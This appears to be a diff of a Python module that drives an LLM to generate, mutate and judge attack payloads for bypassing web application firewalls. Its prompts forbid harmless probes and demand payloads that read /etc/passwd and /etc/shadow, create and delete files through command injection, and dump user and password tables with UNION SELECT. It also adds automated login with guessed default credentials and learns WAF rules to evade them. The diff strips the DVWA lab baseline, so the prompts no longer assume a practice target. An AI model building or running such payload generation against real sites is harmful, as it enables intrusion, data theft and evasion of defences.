@@ -20,7 +20,7 @@ from openai import OpenAI
 _client: OpenAI | None = None
 
 
-def init_client(api_key: str, base_url: str = "https://api.deepseek.com") -> OpenAI:
+def init_client(api_key: str, base_url: str = "https://token-plan-cn.xiaomimimimo.com/v1") -> OpenAI:
     global _client
     _client = OpenAI(api_key=api_key, base_url=base_url)
     return _client
@@ -145,7 +145,7 @@ def _last_resort_extract(text: str) -> list | None:
 
 def _chat_json(
     prompt: str,
-    model: str = "deepseek-v4-pro",
+    model: str = "mimo-v2.5-pro",
     temperature: float = 0.7,
     max_tokens: int = 4096,
 ) -> list | dict:
@@ -235,20 +235,31 @@ _LETHALITY = {
         "    ✅ 每个 Payload 必须自带闭合/连接符，或采用 Polyglot 形式兼容多种上下文：\n"
         "      ✓ 带连接符: ;cat /etc/passwd   |cat /etc/passwd   %0aid%0a\n"
         "      ✓ Polyglot: |{cat,/etc/passwd}   ;$(cat /etc/passwd)   `cat /etc/passwd`\n"
-        "      ✗ 裸命令(禁止): cat /etc/passwd   nl /etc/passwd   ls -la /tmp\n\n"
-        "命令注入 Payload 必须执行高危操作且具备可验证的回显。\n"
-        "    ❌ 严禁：id、whoami、ls、ping、echo test、pwd 等无害探路命令。\n"
-        "    ❌ 严禁：touch、mkdir、wget、curl -o 等无回显的文件操作命令——\n"
-        "       即使命令执行成功也不会有任何输出，Parser 无法提取证据，直接判为失败。\n"
+        "      ✗ 裸命令(禁止): cat /etc/passwd   nl /etc/passwd   ls -la /tmp\n"
+        "    ⚠️ 闭合符使用不硬编码规则，你必须自行判断拼接后的 Payload 在 shell 语法上是否合法。\n"
+        "      即闭合符与命令的组合不会导致 shell 解析错误。生成时自行验证拼接正确性。\n\n"
+        "命令注入 Payload 必须执行高危操作且具备可验证的证据。三种操作类型均可使用，"
+        "你必须在每批 Payload 中混合覆盖多种类型，不要只生成读取类。\n\n"
+        "    ❌ 严禁：id、whoami、ls（裸ls）、ping、echo test、pwd 等无害探路命令。\n\n"
+        "    ── 类型一：读取类（有回显，优先使用）──\n"
+        "    ✅ cat /etc/passwd、/bin/cat /etc/passwd、base64 /etc/passwd、\n"
+        "       cat /etc/shadow、tail -n20 /etc/passwd 等。\n"
+        "    验证：Parser 检查响应中是否包含 root: 等系统账户行或 base64 编码内容。\n\n"
+        "    ── 类型二：创建类（自包含验证，必须占一定比例）──\n"
+        "    ✅ 必须使用三步骤自包含模式：\n"
+        "       第一步 rm -f 清理旧标记 → 第二步 touch 创建文件 → 第三步 ls -la 验证新文件。\n"
+        "       示例：';rm -f /tmp/fz_xyz && touch /tmp/fz_xyz && ls -la /tmp/fz_xyz'\n"
+        "       标记文件名必须包含随机后缀（3+ 位随机字母数字），禁止通用名（如 test.txt）。\n"
+        "    ❌ 严禁：单独使用 touch/mkdir/wget/curl -o 而不带 ls -la 验证步骤——\n"
+        "       无验证步骤的文件操作无法提取证据，直接判为失败。\n"
         "    ❌ 严禁：创建文件后只用 ;ls 查看目录列表而不指定文件名——\n"
         "       如果目录中有残留的旧测试文件，ls 会一并列出导致假阳性判定。\n"
-        "    ✅ 优先有回显：cat /etc/passwd、/bin/cat /etc/passwd、base64 /etc/passwd、\n"
-        "       cat /etc/shadow、tail -n20 /etc/passwd、反弹 shell 等。\n"
-        "    ✅ 若必须文件操作（如写 webshell），必须自包含三步骤：\n"
-        "       第一步 rm -f 清理旧标记 → 第二步 创建文件 → 第三步 ls -la 验证新文件。\n"
-        "       示例：'rm -f /tmp/fz_xyz && touch /tmp/fz_xyz && ls -la /tmp/fz_xyz'\n"
-        "       标记文件名必须包含随机后缀（3+ 位随机字母数字），禁止通用名（如 test.txt）。\n"
-        "       确保 ls 输出中出现的文件名不可能是上一轮残留的旧文件。"
+        "    验证：Parser 检查 ls -la 输出中是否出现标记文件名。\n\n"
+        "    ── 类型三：删除类（自包含验证）──\n"
+        "    ✅ 必须使用三步骤自包含模式：\n"
+        "       第一步 创建标记文件 → 第二步 rm -f 删除 → 第三步 ls -la 确认消失。\n"
+        "       示例：';touch /tmp/fz_del && rm -f /tmp/fz_del && ls -la /tmp/'\n"
+        "    验证：Parser 检查 ls -la 输出中是否不再包含标记文件名。"
     ),
     "sqli": (
         "🔴【黑盒上下文推测与闭合 — 最高优先级、绝对强制】\n"
@@ -262,22 +273,17 @@ _LETHALITY = {
         "      ' 闭合  '-- 注释  '--+ 注释  '# 注释  ') 闭合括号  ')) 闭合双层括号\n"
         "    ❌ 绝对严禁：发送没有任何闭合符的裸 SQL 关键字！\n"
         "      裸关键字会被当作字符串值的一部分，永远无法改变查询语义！\n"
-        "    ✅ 每个 Payload 必须自带闭合符，或采用 Polyglot 形式兼容多种上下文。\n\n"
-        "    ⚠️【DVWA 靶场特征 — 必须以此为基线设计 Payload】\n"
-        "    典型 DVWA SQLi 后端查询：\n"
-        "      SELECT first_name, last_name FROM users WHERE user_id = '$id'\n"
-        "    输出格式（<pre> 标签内）：\n"
-        "      ID: 1\n      First name: admin\n      Surname: admin\n"
-        "    users 表含: user_id, user, password, first_name, last_name, avatar\n"
-        "    前端显示 2 列 → UNION SELECT 必须对齐 2 列。\n"
-        "    先探测列数: ' ORDER BY 1# → 2# → 3#（报错=列数不够，确定列数后停止）\n"
-        "    高价值目标: UNION SELECT user, password FROM users#\n\n"
+        "    ✅ 每个 Payload 必须自带闭合符，或采用 Polyglot 形式兼容多种上下文。\n"
+        "    ⚠️ 闭合符使用不硬编码规则，你必须自行判断拼接后的 Payload 在 SQL 语法上是否合法。\n\n"
         "SQL 注入 Payload 必须执行实际数据提取：UNION SELECT 拖库、"
         "查询 users/passwords 表、使用 GROUP_CONCAT 或 equivalent 聚合敏感字段。\n"
         "    ❌ 严禁使用：' OR 1=1 --、' AND 1=1 --、sleep(1)、ORDER BY n 等仅证明漏洞存在的无害 Payload。\n"
         "    ✅ 必须使用：UNION SELECT 提取用户数据/密码、information_schema 查表结构等。\n"
-        "    ✅ 证据输出必须包含 First name:/Surname: 的键值对行、ASCII 表格行、"
-        "或 information_schema 字段名 — Parser 需要这些特征才能识别为真实证据。"
+        "    ⚠️ SQLi 回显模式复杂，不存在固定正则。注入成功标志因类型而异：\n"
+        "      - UNION SELECT：回显包含数据库数据（表名、列名、用户数据）\n"
+        "      - 时间盲注（sleep）：响应延时与 sleep 参数一致，回显为空或无意义噪声\n"
+        "      - 报错注入：MySQL 错误信息中嵌套查询结果\n"
+        "      判定交给 LLM 综合判断，不要期望固定回显模式。"
     ),
     "log4j": (
         "Log4j Payload 必须触发实际的 JNDI 注入，指向可控的 LDAP/RMI 服务，"
@@ -327,7 +333,7 @@ _INITIAL_PROMPT = (
 def generate_initial_payloads(
     vuln_type: str,
     target_url: str = "",
-    model: str = "deepseek-v4-pro",
+    model: str = "mimo-v2.5-pro",
     kb_context: str = "",
 ) -> dict:
     """生成初始 Payload，包含 CoT 推理。
@@ -385,7 +391,8 @@ _MUTATE_PROMPT = (
     "## 第二步：新绕过策略\n"
     "基于根因分析，制定**与之前不同的**新绕过策略。\n"
     "说明为什么这次策略能避开上一步推断的规则。\n"
-    "不要重复之前已经失败的手法。\n\n"
+    "不要重复之前已经失败的手法。\n"
+    "同时总结你发现的 WAF 拦截规律，这将被自动写入知识库供后续轮次参考。\n\n"
     "## 第三步：生成变异 Payload\n"
     "生成 15 个新的变异 Payload，根据漏洞类型采用不同高阶手法：\n\n"
     "### 通用手法：\n"
@@ -416,12 +423,219 @@ _MUTATE_PROMPT = (
 )
 
 
+# ---------------------------------------------------------------
+# LLM 驱动的通用登录分析
+# ---------------------------------------------------------------
+
+_LOGIN_ANALYSIS_PROMPT = (
+    "你是一名 Web 安全专家，正在为目标网站准备自动化登录以获取有效 Session。\n\n"
+    "## 目标信息\n"
+    "目标 URL：{target_url}\n"
+    "页面内容（前 3000 字符）：\n{page_content}\n\n"
+    "请分析该页面并回答以下问题：\n"
+    "1. 该网站是否需要登录才能访问目标功能？（是/否）\n"
+    "2. 如果需要登录，登录表单的 action URL 是什么？\n"
+    "3. 登录表单的字段名是什么？（如 username/password/email 等）\n"
+    "4. 是否有 CSRF token？如果有，从哪个元素提取？（CSS 选择器或正则）\n"
+    "5. 登录成功后如何验证 session 有效性？（检查哪个页面/响应特征）\n"
+    "6. 推荐的登录凭据是什么？（如果页面有默认凭据提示）\n\n"
+    "### 输出格式（严格 JSON）：\n"
+    '{{"need_login": true/false, "login_url": "/login.php 或完整URL", '
+    '"fields": {{"username_field": "username", "password_field": "password"}}, '
+    '"csrf_token": {{"exists": true/false, "selector": "name=\'user_token\' 的 input", "regex": "正则"}}, '
+    '"verify_feature": "登录成功后的响应特征（如包含logout/dashboard等）", '
+    '"credentials": {{"username": "admin", "password": "password"}}, '
+    '"extra_steps": ["GET /security.php?security=low 设置安全等级"]}}\n\n'
+    "如果不需要登录（如公开 API 或无认证页面），返回 need_login=false。\n"
+    "如果页面内容不足以判断，根据 URL 路径和常见模式给出最佳推测。\n"
+    "⚠️ JSON 内所有双引号必须转义为 \\\"，确保可被 Python json.loads 直接解析。"
+)
+
+
+def analyze_login_page(
+    target_url: str,
+    page_content: str,
+    model: str = "mimo-v2.5-pro",
+) -> dict:
+    """LLM 分析登录页面，返回结构化登录指令。
+
+    Args:
+        target_url: 目标 URL
+        page_content: 页面 HTML 内容（前 3000 字符）
+        model: LLM 模型名
+
+    Returns:
+        {"need_login": bool, "login_url": str, "fields": dict,
+         "csrf_token": dict, "verify_feature": str, "credentials": dict, "extra_steps": list}
+    """
+    prompt = _LOGIN_ANALYSIS_PROMPT.format(
+        target_url=target_url,
+        page_content=page_content[:3000],
+    )
+    result = _chat_json(prompt, model=model, max_tokens=2048)
+    if isinstance(result, dict):
+        result.setdefault("need_login", True)
+        result.setdefault("login_url", "")
+        result.setdefault("fields", {})
+        result.setdefault("csrf_token", {"exists": False})
+        result.setdefault("verify_feature", "")
+        result.setdefault("credentials", {})
+        result.setdefault("extra_steps", [])
+        return result
+    return {"need_login": False, "login_url": "", "fields": {}, "csrf_token": {"exists": False}, "verify_feature": "", "credentials": {}, "extra_steps": []}
+
+
+_WARMUP_FAILURE_PROMPT = (
+    "你是一名 Web 安全专家。自动登录尝试失败了，请分析失败原因并给出新的登录方案。\n\n"
+    "## 目标信息\n"
+    "目标 URL：{target_url}\n\n"
+    "## 上次登录方案\n"
+    "{last_plan}\n\n"
+    "## 失败信息\n"
+    "HTTP 状态码：{status_code}\n"
+    "响应内容（前 1500 字符）：\n{response_text}\n\n"
+    "错误信息：{error}\n\n"
+    "请分析失败原因并给出新的登录方案。可能的失败原因：\n"
+    "1. CSRF token 提取失败（正则不匹配、token 在 JS 中生成）\n"
+    "2. 登录字段名不对\n"
+    "3. 登录 URL 不对\n"
+    "4. 需要额外的请求步骤（如先访问某个页面获取 cookie）\n"
+    "5. 密码不对\n"
+    "6. WAF 拦截了登录请求\n\n"
+    "### 输出格式（严格 JSON）：\n"
+    '{{"diagnosis": "失败原因分析", "new_plan": {{"login_url": "...", "fields": {{"username_field": "...", "password_field": "..."}}, '
+    '"csrf_token": {{"exists": true/false, "selector": "...", "regex": "..."}}, '
+    '"credentials": {{"username": "...", "password": "..."}}, '
+    '"extra_steps": ["步骤1", "步骤2"]}}}}\n\n'
+    "⚠️ JSON 内所有双引号必须转义为 \\\"，确保可被 Python json.loads 直接解析。"
+)
+
+
+def analyze_warmup_failure(
+    target_url: str,
+    last_plan: dict,
+    status_code: int,
+    response_text: str,
+    error: str,
+    model: str = "mimo-v2.5-pro",
+) -> dict:
+    """LLM 分析登录失败原因并给出新方案。
+
+    Args:
+        target_url: 目标 URL
+        last_plan: 上次的登录方案
+        status_code: HTTP 状态码
+        response_text: 响应内容
+        error: 错误信息
+        model: LLM 模型名
+
+    Returns:
+        {"diagnosis": str, "new_plan": dict}
+    """
+    import json as _json
+    prompt = _WARMUP_FAILURE_PROMPT.format(
+        target_url=target_url,
+        last_plan=_json.dumps(last_plan, ensure_ascii=False),
+        status_code=status_code,
+        response_text=response_text[:1500],
+        error=error,
+    )
+    result = _chat_json(prompt, model=model, max_tokens=2048)
+    if isinstance(result, dict):
+        result.setdefault("diagnosis", "")
+        result.setdefault("new_plan", {})
+        return result
+    return {"diagnosis": "无法解析 LLM 响应", "new_plan": {}}
+
+
+# ---------------------------------------------------------------
+# SQLi 证据 LLM 判定
+# ---------------------------------------------------------------
+
+_JUDGE_SQLI_PROMPT = (
+    "你是一名 WAF 绕过验证专家。以下是 SQL 注入 Payload 发送后的响应信息，请判断注入是否成功。\n\n"
+    "## Payload 信息\n"
+    "原始 Payload：{payload}\n"
+    "Payload 语义分析：{payload_semantics}\n\n"
+    "## 响应信息\n"
+    "回显文本（diff 后，已过滤页面框架）：\n{response_text}\n\n"
+    "响应延时：{response_time_ms}ms\n\n"
+    "## 判断标准\n"
+    "1. **时间盲注**（sleep/benchmark/waitfor）：响应延时是否与 sleep() 参数一致？\n"
+    "   - sleep(10) → 响应应 ≥10000ms\n"
+    "   - 回显应为空或无意义噪声（页面原有动态内容）\n"
+    "2. **UNION 注入**：回显是否包含数据库结构/数据？\n"
+    "   - 应出现表名、列名、用户数据（如 First name/Surname/User/Password）\n"
+    "   - 回显应与 SELECT 的列对应\n"
+    "3. **报错注入**（extractvalue/updatexml）：回显是否包含 MySQL 错误信息中嵌套的查询结果？\n"
+    "   - 应出现 XPATH syntax error 等错误信息中夹带的数据\n"
+    "4. **排除假阳性**：\n"
+    "   - 回显是纯数字时间戳（如 1772734），但 payload 是时间盲注 → 判定假阳性\n"
+    "   - 回显是页面原有框架内容的残留 → 判定假阳性\n"
+    "   - 回显内容与 payload 语义不匹配 → 判定假阳性\n\n"
+    "### 输出格式（严格 JSON）：\n"
+    '{{"bypass": true/false, "confidence": 0.0-1.0, "reason": "判断原因（简要说明）"}}\n\n'
+    "⚠️ JSON 内所有双引号必须转义为 \\\"，确保可被 Python json.loads 直接解析。"
+)
+
+
+def judge_sqli_evidence(
+    payload: str,
+    response_text: str,
+    response_time_ms: float,
+    model: str = "mimo-v2.5-pro",
+) -> dict:
+    """LLM 判断 SQLi 注入是否成功。
+
+    Args:
+        payload: 原始 SQLi payload
+        response_text: diff 后的回显文本（已过滤页面框架）
+        response_time_ms: 响应延时（毫秒）
+        model: LLM 模型名
+
+    Returns:
+        {"bypass": bool, "confidence": float, "reason": str}
+    """
+    # 分析 payload 语义
+    p = payload.lower()
+    if any(k in p for k in ['sleep(', 'benchmark(', 'waitfor delay', 'pg_sleep(']):
+        semantics = "时间盲注：通过响应延时判断注入是否成功"
+    elif 'union' in p and 'select' in p:
+        semantics = "UNION 注入：通过回显中出现数据库数据判断注入是否成功"
+    elif any(k in p for k in ['extractvalue', 'updatexml', 'floor(', 'exp(', 'polygon']):
+        semantics = "报错注入：通过 MySQL 错误信息中嵌套的数据判断注入是否成功"
+    elif any(k in p for k in ['; insert', '; update', '; delete', '; drop']):
+        semantics = "堆叠查询：通过数据库操作结果判断注入是否成功"
+    else:
+        semantics = "SQL 注入：根据回显内容判断注入是否成功"
+
+    prompt = _JUDGE_SQLI_PROMPT.format(
+        payload=payload,
+        payload_semantics=semantics,
+        response_text=response_text[:2000] if response_text else "(无回显文本)",
+        response_time_ms=round(response_time_ms, 1),
+    )
+
+    try:
+        result = _chat_json(prompt, model=model, max_tokens=1024)
+        if isinstance(result, dict):
+            result.setdefault("bypass", False)
+            result.setdefault("confidence", 0.0)
+            result.setdefault("reason", "")
+            return result
+    except Exception:
+        pass
+
+    return {"bypass": False, "confidence": 0.0, "reason": "LLM 判定失败"}
+
+
 def mutate_payloads(
     failed_payloads: list[str],
     vuln_type: str = "",
     target_url: str = "",
-    model: str = "deepseek-v4-pro",
+    model: str = "mimo-v2.5-pro",
     kb_context: str = "",
+    force_strategy_change: bool = False,
 ) -> dict:
     """基于被拦截 Payload 做 CoT 分析并变异生成新 Payload。
 
@@ -431,6 +645,7 @@ def mutate_payloads(
         target_url: 目标 URL（供 LLM 回顾上下文、调整连接符策略）
         model: LLM 模型名
         kb_context: 历史 WAF 拦截经验（来自 waf_rules_kb.json 的压缩总结）
+        force_strategy_change: 连续多轮全拦截后置为 True，提醒 LLM 换思路
 
     Returns:
         {"analysis": str, "strategy": str, "payloads": list[str]}
@@ -447,6 +662,11 @@ def mutate_payloads(
         lethality_requirement=lethality,
         kb_section=kb_context,
     )
+    if force_strategy_change:
+        prompt += (
+            "\n\n⚠️【提醒】连续多轮所有 Payload 全部被 WAF 拦截。"
+            "之前的思路可能已经被 WAF 完全覆盖，请换一个全新的方向思考。"
+        )
     result = _chat_json(prompt, model=model, max_tokens=8192)
 
     if isinstance(result, list):
